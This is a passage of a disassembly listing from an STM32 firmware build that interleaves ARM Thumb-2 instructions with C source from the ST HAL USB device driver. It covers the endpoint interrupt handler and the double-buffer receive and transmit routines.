 8002c6a:	f009 fe7c 	bl	800c966 <HAL_PCD_DataInStageCallback>
 8002c6e:	e051      	b.n	8002d14 <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else
        {
          /* Manage Single Buffer Transaction */
          if ((wEPVal & USB_EP_KIND) == 0U)
 8002c70:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002c74:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8002c78:	2b00      	cmp	r3, #0
 8002c7a:	d144      	bne.n	8002d06 <PCD_EP_ISR_Handler+0x760>
          {
            /* multi-packet on the NON control IN endpoint */
            TxPctSize = (uint16_t)PCD_GET_EP_TX_CNT(hpcd->Instance, ep->num);
 8002c7c:	687b      	ldr	r3, [r7, #4]
 8002c7e:	681b      	ldr	r3, [r3, #0]
 8002c80:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002c84:	b29b      	uxth	r3, r3
 8002c86:	461a      	mov	r2, r3
 8002c88:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c8a:	781b      	ldrb	r3, [r3, #0]
 8002c8c:	00db      	lsls	r3, r3, #3
 8002c8e:	4413      	add	r3, r2
 8002c90:	687a      	ldr	r2, [r7, #4]
 8002c92:	6812      	ldr	r2, [r2, #0]
 8002c94:	4413      	add	r3, r2
 8002c96:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002c9a:	881b      	ldrh	r3, [r3, #0]
 8002c9c:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002ca0:	f8a7 3040 	strh.w	r3, [r7, #64]	; 0x40

            if (ep->xfer_len > TxPctSize)
 8002ca4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ca6:	699a      	ldr	r2, [r3, #24]
 8002ca8:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002cac:	429a      	cmp	r2, r3
 8002cae:	d907      	bls.n	8002cc0 <PCD_EP_ISR_Handler+0x71a>
            {
              ep->xfer_len -= TxPctSize;
 8002cb0:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002cb2:	699a      	ldr	r2, [r3, #24]
 8002cb4:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002cb8:	1ad2      	subs	r2, r2, r3
 8002cba:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002cbc:	619a      	str	r2, [r3, #24]
 8002cbe:	e002      	b.n	8002cc6 <PCD_EP_ISR_Handler+0x720>
            }
            else
            {
              ep->xfer_len = 0U;
 8002cc0:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002cc2:	2200      	movs	r2, #0
 8002cc4:	619a      	str	r2, [r3, #24]
            }

            /* Zero Length Packet? */
            if (ep->xfer_len == 0U)
 8002cc6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002cc8:	699b      	ldr	r3, [r3, #24]
 8002cca:	2b00      	cmp	r3, #0
 8002ccc:	d106      	bne.n	8002cdc <PCD_EP_ISR_Handler+0x736>
            {
              /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
              hpcd->DataInStageCallback(hpcd, ep->num);
#else
              HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8002cce:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002cd0:	781b      	ldrb	r3, [r3, #0]
 8002cd2:	4619      	mov	r1, r3
 8002cd4:	6878      	ldr	r0, [r7, #4]
 8002cd6:	f009 fe46 	bl	800c966 <HAL_PCD_DataInStageCallback>
 8002cda:	e01b      	b.n	8002d14 <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
            }
            else
            {
              /* Transfer is not yet Done */
              ep->xfer_buff += TxPctSize;
 8002cdc:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002cde:	695a      	ldr	r2, [r3, #20]
 8002ce0:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002ce4:	441a      	add	r2, r3
 8002ce6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ce8:	615a      	str	r2, [r3, #20]
              ep->xfer_count += TxPctSize;
 8002cea:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002cec:	69da      	ldr	r2, [r3, #28]
 8002cee:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002cf2:	441a      	add	r2, r3
 8002cf4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002cf6:	61da      	str	r2, [r3, #28]
              (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002cf8:	687b      	ldr	r3, [r7, #4]
 8002cfa:	681b      	ldr	r3, [r3, #0]
 8002cfc:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002cfe:	4618      	mov	r0, r3
 8002d00:	f003 fec3 	bl	8006a8a <USB_EPStartXfer>
 8002d04:	e006      	b.n	8002d14 <PCD_EP_ISR_Handler+0x76e>
          }
#if (USE_USB_DOUBLE_BUFFER == 1U)
          /* Double Buffer bulk IN (bulk transfer Len > Ep_Mps) */
          else
          {
            (void)HAL_PCD_EP_DB_Transmit(hpcd, ep, wEPVal);
 8002d06:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002d0a:	461a      	mov	r2, r3
 8002d0c:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002d0e:	6878      	ldr	r0, [r7, #4]
 8002d10:	f000 f917 	bl	8002f42 <HAL_PCD_EP_DB_Transmit>
  while ((hpcd->Instance->ISTR & USB_ISTR_CTR) != 0U)
 8002d14:	687b      	ldr	r3, [r7, #4]
 8002d16:	681b      	ldr	r3, [r3, #0]
 8002d18:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002d1c:	b29b      	uxth	r3, r3
 8002d1e:	b21b      	sxth	r3, r3
 8002d20:	2b00      	cmp	r3, #0
 8002d22:	f6ff ac45 	blt.w	80025b0 <PCD_EP_ISR_Handler+0xa>
        }
      }
    }
  }

  return HAL_OK;
 8002d26:	2300      	movs	r3, #0
}
 8002d28:	4618      	mov	r0, r3
 8002d2a:	3758      	adds	r7, #88	; 0x58
 8002d2c:	46bd      	mov	sp, r7
 8002d2e:	bd80      	pop	{r7, pc}

08002d30 <HAL_PCD_EP_DB_Receive>:
  * @param  wEPVal Last snapshot of EPRx register value taken in ISR
  * @retval HAL status
  */
static uint16_t HAL_PCD_EP_DB_Receive(PCD_HandleTypeDef *hpcd,
                                      PCD_EPTypeDef *ep, uint16_t wEPVal)
{
 8002d30:	b580      	push	{r7, lr}
 8002d32:	b088      	sub	sp, #32
 8002d34:	af00      	add	r7, sp, #0
 8002d36:	60f8      	str	r0, [r7, #12]
 8002d38:	60b9      	str	r1, [r7, #8]
 8002d3a:	4613      	mov	r3, r2
 8002d3c:	80fb      	strh	r3, [r7, #6]
  uint16_t count;

  /* Manage Buffer0 OUT */
  if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 8002d3e:	88fb      	ldrh	r3, [r7, #6]
 8002d40:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8002d44:	2b00      	cmp	r3, #0
 8002d46:	d07c      	beq.n	8002e42 <HAL_PCD_EP_DB_Receive+0x112>
  {
    /* Get count of received Data on buffer0 */
    count = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 8002d48:	68fb      	ldr	r3, [r7, #12]
 8002d4a:	681b      	ldr	r3, [r3, #0]
 8002d4c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002d50:	b29b      	uxth	r3, r3
 8002d52:	461a      	mov	r2, r3
 8002d54:	68bb      	ldr	r3, [r7, #8]
 8002d56:	781b      	ldrb	r3, [r3, #0]
 8002d58:	00db      	lsls	r3, r3, #3
 8002d5a:	4413      	add	r3, r2
 8002d5c:	68fa      	ldr	r2, [r7, #12]
 8002d5e:	6812      	ldr	r2, [r2, #0]
 8002d60:	4413      	add	r3, r2
 8002d62:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002d66:	881b      	ldrh	r3, [r3, #0]
 8002d68:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002d6c:	837b      	strh	r3, [r7, #26]

    if (ep->xfer_len >= count)
 8002d6e:	68bb      	ldr	r3, [r7, #8]
 8002d70:	699a      	ldr	r2, [r3, #24]
 8002d72:	8b7b      	ldrh	r3, [r7, #26]
 8002d74:	429a      	cmp	r2, r3
 8002d76:	d306      	bcc.n	8002d86 <HAL_PCD_EP_DB_Receive+0x56>
    {
      ep->xfer_len -= count;
 8002d78:	68bb      	ldr	r3, [r7, #8]
 8002d7a:	699a      	ldr	r2, [r3, #24]
 8002d7c:	8b7b      	ldrh	r3, [r7, #26]
 8002d7e:	1ad2      	subs	r2, r2, r3
 8002d80:	68bb      	ldr	r3, [r7, #8]
 8002d82:	619a      	str	r2, [r3, #24]
 8002d84:	e002      	b.n	8002d8c <HAL_PCD_EP_DB_Receive+0x5c>
    }
    else
    {
      ep->xfer_len = 0U;
 8002d86:	68bb      	ldr	r3, [r7, #8]
 8002d88:	2200      	movs	r2, #0
 8002d8a:	619a      	str	r2, [r3, #24]
    }

    if (ep->xfer_len == 0U)
 8002d8c:	68bb      	ldr	r3, [r7, #8]
 8002d8e:	699b      	ldr	r3, [r3, #24]
 8002d90:	2b00      	cmp	r3, #0
 8002d92:	d123      	bne.n	8002ddc <HAL_PCD_EP_DB_Receive+0xac>
    {
      /* set NAK to OUT endpoint since double buffer is enabled */
      PCD_SET_EP_RX_STATUS(hpcd->Instance, ep->num, USB_EP_RX_NAK);
 8002d94:	68fb      	ldr	r3, [r7, #12]
 8002d96:	681b      	ldr	r3, [r3, #0]
 8002d98:	461a      	mov	r2, r3
 8002d9a:	68bb      	ldr	r3, [r7, #8]
 8002d9c:	781b      	ldrb	r3, [r3, #0]
 8002d9e:	009b      	lsls	r3, r3, #2
 8002da0:	4413      	add	r3, r2
 8002da2:	881b      	ldrh	r3, [r3, #0]
 8002da4:	b29b      	uxth	r3, r3
 8002da6:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002daa:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002dae:	833b      	strh	r3, [r7, #24]
 8002db0:	8b3b      	ldrh	r3, [r7, #24]
 8002db2:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8002db6:	833b      	strh	r3, [r7, #24]
 8002db8:	68fb      	ldr	r3, [r7, #12]
 8002dba:	681b      	ldr	r3, [r3, #0]
 8002dbc:	461a      	mov	r2, r3
 8002dbe:	68bb      	ldr	r3, [r7, #8]
 8002dc0:	781b      	ldrb	r3, [r3, #0]
 8002dc2:	009b      	lsls	r3, r3, #2
 8002dc4:	441a      	add	r2, r3
 8002dc6:	8b3b      	ldrh	r3, [r7, #24]
 8002dc8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002dcc:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002dd0:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002dd4:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8002dd8:	b29b      	uxth	r3, r3
 8002dda:	8013      	strh	r3, [r2, #0]
    }

    /* Check if Buffer1 is in blocked state which requires to toggle */
    if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002ddc:	88fb      	ldrh	r3, [r7, #6]
 8002dde:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002de2:	2b00      	cmp	r3, #0
 8002de4:	d01f      	beq.n	8002e26 <HAL_PCD_EP_DB_Receive+0xf6>
    {
      PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8002de6:	68fb      	ldr	r3, [r7, #12]
 8002de8:	681b      	ldr	r3, [r3, #0]
 8002dea:	461a      	mov	r2, r3
 8002dec:	68bb      	ldr	r3, [r7, #8]
 8002dee:	781b      	ldrb	r3, [r3, #0]
 8002df0:	009b      	lsls	r3, r3, #2
 8002df2:	4413      	add	r3, r2
 8002df4:	881b      	ldrh	r3, [r3, #0]
 8002df6:	b29b      	uxth	r3, r3
 8002df8:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8002dfc:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002e00:	82fb      	strh	r3, [r7, #22]
 8002e02:	68fb      	ldr	r3, [r7, #12]
 8002e04:	681b      	ldr	r3, [r3, #0]
 8002e06:	461a      	mov	r2, r3
 8002e08:	68bb      	ldr	r3, [r7, #8]
 8002e0a:	781b      	ldrb	r3, [r3, #0]
 8002e0c:	009b      	lsls	r3, r3, #2
 8002e0e:	441a      	add	r2, r3
 8002e10:	8afb      	ldrh	r3, [r7, #22]
 8002e12:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002e16:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002e1a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002e1e:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8002e22:	b29b      	uxth	r3, r3
 8002e24:	8013      	strh	r3, [r2, #0]
    }

    if (count != 0U)
 8002e26:	8b7b      	ldrh	r3, [r7, #26]
 8002e28:	2b00      	cmp	r3, #0
 8002e2a:	f000 8085 	beq.w	8002f38 <HAL_PCD_EP_DB_Receive+0x208>
    {
      USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr0, count);
 8002e2e:	68fb      	ldr	r3, [r7, #12]
 8002e30:	6818      	ldr	r0, [r3, #0]
 8002e32:	68bb      	ldr	r3, [r7, #8]
 8002e34:	6959      	ldr	r1, [r3, #20]
 8002e36:	68bb      	ldr	r3, [r7, #8]
 8002e38:	891a      	ldrh	r2, [r3, #8]
 8002e3a:	8b7b      	ldrh	r3, [r7, #26]
 8002e3c:	f005 fb73 	bl	8008526 <USB_ReadPMA>
 8002e40:	e07a      	b.n	8002f38 <HAL_PCD_EP_DB_Receive+0x208>
  }
  /* Manage Buffer 1 DTOG_RX=0 */
  else
  {
    /* Get count of received data */
    count = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 8002e42:	68fb      	ldr	r3, [r7, #12]
 8002e44:	681b      	ldr	r3, [r3, #0]
 8002e46:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002e4a:	b29b      	uxth	r3, r3
 8002e4c:	461a      	mov	r2, r3
 8002e4e:	68bb      	ldr	r3, [r7, #8]
 8002e50:	781b      	ldrb	r3, [r3, #0]
 8002e52:	00db      	lsls	r3, r3, #3
 8002e54:	4413      	add	r3, r2
 8002e56:	68fa      	ldr	r2, [r7, #12]
 8002e58:	6812      	ldr	r2, [r2, #0]
 8002e5a:	4413      	add	r3, r2
 8002e5c:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002e60:	881b      	ldrh	r3, [r3, #0]
 8002e62:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002e66:	837b      	strh	r3, [r7, #26]

    if (ep->xfer_len >= count)
 8002e68:	68bb      	ldr	r3, [r7, #8]
 8002e6a:	699a      	ldr	r2, [r3, #24]
 8002e6c:	8b7b      	ldrh	r3, [r7, #26]
 8002e6e:	429a      	cmp	r2, r3
 8002e70:	d306      	bcc.n	8002e80 <HAL_PCD_EP_DB_Receive+0x150>
    {
      ep->xfer_len -= count;
 8002e72:	68bb      	ldr	r3, [r7, #8]
 8002e74:	699a      	ldr	r2, [r3, #24]
 8002e76:	8b7b      	ldrh	r3, [r7, #26]
 8002e78:	1ad2      	subs	r2, r2, r3
 8002e7a:	68bb      	ldr	r3, [r7, #8]
 8002e7c:	619a      	str	r2, [r3, #24]
 8002e7e:	e002      	b.n	8002e86 <HAL_PCD_EP_DB_Receive+0x156>
    }
    else
    {
      ep->xfer_len = 0U;
 8002e80:	68bb      	ldr	r3, [r7, #8]
 8002e82:	2200      	movs	r2, #0
 8002e84:	619a      	str	r2, [r3, #24]
    }

    if (ep->xfer_len == 0U)
 8002e86:	68bb      	ldr	r3, [r7, #8]
 8002e88:	699b      	ldr	r3, [r3, #24]
 8002e8a:	2b00      	cmp	r3, #0
 8002e8c:	d123      	bne.n	8002ed6 <HAL_PCD_EP_DB_Receive+0x1a6>
    {
      /* set NAK on the current endpoint */
      PCD_SET_EP_RX_STATUS(hpcd->Instance, ep->num, USB_EP_RX_NAK);
 8002e8e:	68fb      	ldr	r3, [r7, #12]
 8002e90:	681b      	ldr	r3, [r3, #0]
 8002e92:	461a      	mov	r2, r3
 8002e94:	68bb      	ldr	r3, [r7, #8]
 8002e96:	781b      	ldrb	r3, [r3, #0]
 8002e98:	009b      	lsls	r3, r3, #2
 8002e9a:	4413      	add	r3, r2
 8002e9c:	881b      	ldrh	r3, [r3, #0]
 8002e9e:	b29b      	uxth	r3, r3
 8002ea0:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002ea4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002ea8:	83fb      	strh	r3, [r7, #30]
 8002eaa:	8bfb      	ldrh	r3, [r7, #30]
 8002eac:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8002eb0:	83fb      	strh	r3, [r7, #30]
 8002eb2:	68fb      	ldr	r3, [r7, #12]
 8002eb4:	681b      	ldr	r3, [r3, #0]
 8002eb6:	461a      	mov	r2, r3
 8002eb8:	68bb      	ldr	r3, [r7, #8]
 8002eba:	781b      	ldrb	r3, [r3, #0]
 8002ebc:	009b      	lsls	r3, r3, #2
 8002ebe:	441a      	add	r2, r3
 8002ec0:	8bfb      	ldrh	r3, [r7, #30]
 8002ec2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002ec6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002eca:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002ece:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8002ed2:	b29b      	uxth	r3, r3
 8002ed4:	8013      	strh	r3, [r2, #0]
    }

    /*Need to FreeUser Buffer*/
    if ((wEPVal & USB_EP_DTOG_TX) == 0U)
 8002ed6:	88fb      	ldrh	r3, [r7, #6]
 8002ed8:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002edc:	2b00      	cmp	r3, #0
 8002ede:	d11f      	bne.n	8002f20 <HAL_PCD_EP_DB_Receive+0x1f0>
    {
      PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8002ee0:	68fb      	ldr	r3, [r7, #12]
 8002ee2:	681b      	ldr	r3, [r3, #0]
 8002ee4:	461a      	mov	r2, r3
 8002ee6:	68bb      	ldr	r3, [r7, #8]
 8002ee8:	781b      	ldrb	r3, [r3, #0]
 8002eea:	009b      	lsls	r3, r3, #2
 8002eec:	4413      	add	r3, r2
 8002eee:	881b      	ldrh	r3, [r3, #0]
 8002ef0:	b29b      	uxth	r3, r3
 8002ef2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8002ef6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002efa:	83bb      	strh	r3, [r7, #28]
 8002efc:	68fb      	ldr	r3, [r7, #12]
 8002efe:	681b      	ldr	r3, [r3, #0]
 8002f00:	461a      	mov	r2, r3
 8002f02:	68bb      	ldr	r3, [r7, #8]
 8002f04:	781b      	ldrb	r3, [r3, #0]
 8002f06:	009b      	lsls	r3, r3, #2
 8002f08:	441a      	add	r2, r3
 8002f0a:	8bbb      	ldrh	r3, [r7, #28]
 8002f0c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002f10:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002f14:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002f18:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8002f1c:	b29b      	uxth	r3, r3
 8002f1e:	8013      	strh	r3, [r2, #0]
    }

    if (count != 0U)
 8002f20:	8b7b      	ldrh	r3, [r7, #26]
 8002f22:	2b00      	cmp	r3, #0
 8002f24:	d008      	beq.n	8002f38 <HAL_PCD_EP_DB_Receive+0x208>
    {
      USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr1, count);
 8002f26:	68fb      	ldr	r3, [r7, #12]
 8002f28:	6818      	ldr	r0, [r3, #0]
 8002f2a:	68bb      	ldr	r3, [r7, #8]
 8002f2c:	6959      	ldr	r1, [r3, #20]
 8002f2e:	68bb      	ldr	r3, [r7, #8]
 8002f30:	895a      	ldrh	r2, [r3, #10]
 8002f32:	8b7b      	ldrh	r3, [r7, #26]
 8002f34:	f005 faf7 	bl	8008526 <USB_ReadPMA>
    }
  }

  return count;
 8002f38:	8b7b      	ldrh	r3, [r7, #26]
}
 8002f3a:	4618      	mov	r0, r3
 8002f3c:	3720      	adds	r7, #32
 8002f3e:	46bd      	mov	sp, r7
 8002f40:	bd80      	pop	{r7, pc}

08002f42 <HAL_PCD_EP_DB_Transmit>:
  * @param  wEPVal Last snapshot of EPRx register value taken in ISR
  * @retval HAL status
  */
static HAL_StatusTypeDef HAL_PCD_EP_DB_Transmit(PCD_HandleTypeDef *hpcd,
                                                PCD_EPTypeDef *ep, uint16_t wEPVal)
{
 8002f42:	b580      	push	{r7, lr}
 8002f44:	b0a4      	sub	sp, #144	; 0x90
 8002f46:	af00      	add	r7, sp, #0
 8002f48:	60f8      	str	r0, [r7, #12]
 8002f4a:	60b9      	str	r1, [r7, #8]
 8002f4c:	4613      	mov	r3, r2
 8002f4e:	80fb      	strh	r3, [r7, #6]
  uint32_t len;
  uint16_t TxPctSize;

  /* Data Buffer0 ACK received */
  if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002f50:	88fb      	ldrh	r3, [r7, #6]
 8002f52:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002f56:	2b00      	cmp	r3, #0
 8002f58:	f000 81db 	beq.w	8003312 <HAL_PCD_EP_DB_Transmit+0x3d0>
  {
    /* multi-packet on the NON control IN endpoint */
    TxPctSize = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 8002f5c:	68fb      	ldr	r3, [r7, #12]
 8002f5e:	681b      	ldr	r3, [r3, #0]
 8002f60:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002f64:	b29b      	uxth	r3, r3
 8002f66:	461a      	mov	r2, r3
 8002f68:	68bb      	ldr	r3, [r7, #8]
 8002f6a:	781b      	ldrb	r3, [r3, #0]
 8002f6c:	00db      	lsls	r3, r3, #3
 8002f6e:	4413      	add	r3, r2
 8002f70:	68fa      	ldr	r2, [r7, #12]
 8002f72:	6812      	ldr	r2, [r2, #0]
 8002f74:	4413      	add	r3, r2
 8002f76:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002f7a:	881b      	ldrh	r3, [r3, #0]
 8002f7c:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002f80:	f8a7 3086 	strh.w	r3, [r7, #134]	; 0x86

    if (ep->xfer_len > TxPctSize)
 8002f84:	68bb      	ldr	r3, [r7, #8]
 8002f86:	699a      	ldr	r2, [r3, #24]
 8002f88:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8002f8c:	429a      	cmp	r2, r3
 8002f8e:	d907      	bls.n	8002fa0 <HAL_PCD_EP_DB_Transmit+0x5e>
    {
      ep->xfer_len -= TxPctSize;
 8002f90:	68bb      	ldr	r3, [r7, #8]
 8002f92:	699a      	ldr	r2, [r3, #24]
 8002f94:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8002f98:	1ad2      	subs	r2, r2, r3
 8002f9a:	68bb      	ldr	r3, [r7, #8]
 8002f9c:	619a      	str	r2, [r3, #24]
 8002f9e:	e002      	b.n	8002fa6 <HAL_PCD_EP_DB_Transmit+0x64>
    }
    else
    {
      ep->xfer_len = 0U;
 8002fa0:	68bb      	ldr	r3, [r7, #8]
 8002fa2:	2200      	movs	r2, #0
 8002fa4:	619a      	str	r2, [r3, #24]
    }

    /* Transfer is completed */
    if (ep->xfer_len == 0U)
 8002fa6:	68bb      	ldr	r3, [r7, #8]
 8002fa8:	699b      	ldr	r3, [r3, #24]
 8002faa:	2b00      	cmp	r3, #0
 8002fac:	f040 80b9 	bne.w	8003122 <HAL_PCD_EP_DB_Transmit+0x1e0>
    {
      PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002fb0:	68bb      	ldr	r3, [r7, #8]
 8002fb2:	785b      	ldrb	r3, [r3, #1]
 8002fb4:	2b00      	cmp	r3, #0
 8002fb6:	d126      	bne.n	8003006 <HAL_PCD_EP_DB_Transmit+0xc4>
 8002fb8:	68fb      	ldr	r3, [r7, #12]
 8002fba:	681b      	ldr	r3, [r3, #0]
 8002fbc:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002fbe:	68fb      	ldr	r3, [r7, #12]
 8002fc0:	681b      	ldr	r3, [r3, #0]
 8002fc2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002fc6:	b29b      	uxth	r3, r3
 8002fc8:	461a      	mov	r2, r3
 8002fca:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002fcc:	4413      	add	r3, r2
 8002fce:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002fd0:	68bb      	ldr	r3, [r7, #8]
 8002fd2:	781b      	ldrb	r3, [r3, #0]
 8002fd4:	00da      	lsls	r2, r3, #3
 8002fd6:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002fd8:	4413      	add	r3, r2
 8002fda:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002fde:	62bb      	str	r3, [r7, #40]	; 0x28
 8002fe0:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002fe2:	881b      	ldrh	r3, [r3, #0]
 8002fe4:	b29b      	uxth	r3, r3
 8002fe6:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002fea:	b29a      	uxth	r2, r3
 8002fec:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002fee:	801a      	strh	r2, [r3, #0]
 8002ff0:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002ff2:	881b      	ldrh	r3, [r3, #0]
 8002ff4:	b29b      	uxth	r3, r3
 8002ff6:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002ffa:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002ffe:	b29a      	uxth	r2, r3
 8003000:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8003002:	801a      	strh	r2, [r3, #0]
 8003004:	e01a      	b.n	800303c <HAL_PCD_EP_DB_Transmit+0xfa>
 8003006:	68bb      	ldr	r3, [r7, #8]
 8003008:	785b      	ldrb	r3, [r3, #1]
 800300a:	2b01      	cmp	r3, #1
 800300c:	d116      	bne.n	800303c <HAL_PCD_EP_DB_Transmit+0xfa>
 800300e:	68fb      	ldr	r3, [r7, #12]
 8003010:	681b      	ldr	r3, [r3, #0]
 8003012:	637b      	str	r3, [r7, #52]	; 0x34
 8003014:	68fb      	ldr	r3, [r7, #12]
 8003016:	681b      	ldr	r3, [r3, #0]
 8003018:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800301c:	b29b      	uxth	r3, r3
 800301e:	461a      	mov	r2, r3
 8003020:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8003022:	4413      	add	r3, r2
 8003024:	637b      	str	r3, [r7, #52]	; 0x34
 8003026:	68bb      	ldr	r3, [r7, #8]
 8003028:	781b      	ldrb	r3, [r3, #0]
 800302a:	00da      	lsls	r2, r3, #3
 800302c:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800302e:	4413      	add	r3, r2
 8003030:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8003034:	633b      	str	r3, [r7, #48]	; 0x30
 8003036:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8003038:	2200      	movs	r2, #0
 800303a:	801a      	strh	r2, [r3, #0]
      PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 800303c:	68fb      	ldr	r3, [r7, #12]
 800303e:	681b      	ldr	r3, [r3, #0]
 8003040:	627b      	str	r3, [r7, #36]	; 0x24
 8003042:	68bb      	ldr	r3, [r7, #8]
 8003044:	785b      	ldrb	r3, [r3, #1]
 8003046:	2b00      	cmp	r3, #0
 8003048:	d126      	bne.n	8003098 <HAL_PCD_EP_DB_Transmit+0x156>
 800304a:	68fb      	ldr	r3, [r7, #12]
 800304c:	681b      	ldr	r3, [r3, #0]
 800304e:	61fb      	str	r3, [r7, #28]
 8003050:	68fb      	ldr	r3, [r7, #12]
 8003052:	681b      	ldr	r3, [r3, #0]
 8003054:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003058:	b29b      	uxth	r3, r3
 800305a:	461a      	mov	r2, r3
 800305c:	69fb      	ldr	r3, [r7, #28]
 800305e:	4413      	add	r3, r2
 8003060:	61fb      	str	r3, [r7, #28]
 8003062:	68bb      	ldr	r3, [r7, #8]
 8003064:	781b      	ldrb	r3, [r3, #0]
 8003066:	00da      	lsls	r2, r3, #3
 8003068:	69fb      	ldr	r3, [r7, #28]
 800306a:	4413      	add	r3, r2
 800306c:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003070:	61bb      	str	r3, [r7, #24]
 8003072:	69bb      	ldr	r3, [r7, #24]
 8003074:	881b      	ldrh	r3, [r3, #0]
 8003076:	b29b      	uxth	r3, r3
 8003078:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800307c:	b29a      	uxth	r2, r3
 800307e:	69bb      	ldr	r3, [r7, #24]
 8003080:	801a      	strh	r2, [r3, #0]
 8003082:	69bb      	ldr	r3, [r7, #24]
